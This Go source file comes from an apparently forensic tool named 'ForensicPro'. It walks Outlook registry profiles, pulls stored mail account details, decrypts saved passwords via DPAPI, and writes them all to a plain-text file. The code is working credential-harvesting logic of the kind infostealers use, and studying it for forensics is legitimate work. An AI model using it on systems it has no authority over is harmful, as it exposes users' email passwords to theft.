package Mails

import (
	"ForensicPro/utils"
	"bytes"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var OutlookName = "Outlook"
var mailClient = regexp.MustCompile(`^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$`)

// 重新设计正则表达式，避免使用负向前瞻断言
var smtpClient = regexp.MustCompile(`^([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}$`)

func GrabOutlook() string {
	var stringBuilder bytes.Buffer
	paths := []string{
		"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
		"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
		"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
		"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676",
	}
	clients := []string{
		"SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address", "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
		"Email", "HTTP User", "HTTP Server URL", "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2", "IMAP Password2",
		"NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password", "NNTP Password", "HTTPMail Password", "SMTP Password",
	}

	for _, path := range paths {
		stringBuilder.WriteString(Get(path, clients))
	}
	return stringBuilder.String()
}

// GetInfoFromRegistry retrieves a value from the Windows Registry.
func GetInfoFromRegistry(path string, valueName string) (interface{}, error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE)
	if err != nil {
		return nil, err
	}
	defer key.Close()

	value, _, err := key.GetStringValue(valueName)
	if err != nil {
		return nil, err
	}

	return value, nil
}
func Get(path string, clients []string) string {
	var stringBuilder bytes.Buffer

	for _, text := range clients {
		infoFromRegistry, err := GetInfoFromRegistry(path, text)
		if err != nil {
			continue
		}

		if infoFromRegistry != nil {
			switch v := infoFromRegistry.(type) {
			case string:
				if strings.Contains(text, "Password") && !strings.Contains(text, "2") {
					// Placeholder for actual decryption logic
					stringBuilder.WriteString(fmt.Sprintf("%s: %s\n", text, DecryptValue([]byte(v))))
				} else if smtpClient.MatchString(v) || mailClient.MatchString(v) {
					stringBuilder.WriteString(fmt.Sprintf("%s: %s\n", text, v))
				} else {
					stringBuilder.WriteString(fmt.Sprintf("%s: %s\n", text, strings.ReplaceAll(v, string(rune(0)), "")))
				}
			case []byte:
				if strings.Contains(text, "Password") && !strings.Contains(text, "2") {
					// Placeholder for actual decryption logic
					stringBuilder.WriteString(fmt.Sprintf("%s: %s\n", text, DecryptValue(v)))
				} else if smtpClient.MatchString(string(v)) || mailClient.MatchString(string(v)) {
					stringBuilder.WriteString(fmt.Sprintf("%s: %s\n", text, string(v)))
				} else {
					stringBuilder.WriteString(fmt.Sprintf("%s: %s\n", text, strings.ReplaceAll(string(v), string(rune(0)), "")))
				}
			default:
				continue
			}
		}
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE)
	if err != nil {
		return stringBuilder.String()
	}
	defer key.Close()
	const maxSubKeys = 1000 // 假设最多有1000个子键

	subKeys, err := key.ReadSubKeyNames(maxSubKeys)
	if err != nil {
		return stringBuilder.String()
	}

	for _, subKey := range subKeys {
		subPath := path + "\\" + subKey
		subResult := Get(subPath, clients)
		if subResult != "" {
			stringBuilder.WriteString(subResult)
		}
	}

	return stringBuilder.String()
}

func DecryptValue(encrypted []byte) string {
	tryDecrypt := func() (string, error) {
		// 创建一个新的字节数组，长度为原数组长度减1
		array := make([]byte, len(encrypted)-1)
		copy(array, encrypted[1:])

		// 使用 DPAPI 进行解密
		decrypted, err := utils.DecryptData(array)
		if err != nil {
			return "", err
		}

		// 将解密后的字节数组转换为字符串，并移除空字符
		result := string(decrypted)
		result = strings.ReplaceAll(result, string(rune(0)), "")
		return result, nil
	}

	// 尝试解密
	result, err := tryDecrypt()
	if err != nil {
		fmt.Println("解密失败:", err)
		return "null"
	}

	return result
}
func OutlookSave(path string) {
	text := GrabOutlook()
	if text != "" {
		targetPath := filepath.Join(path, OutlookName)
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}
		utils.WriteToFile(text, path+"\\"+OutlookName+".txt")
	}
	fmt.Println("Outlook 取证结束")

}
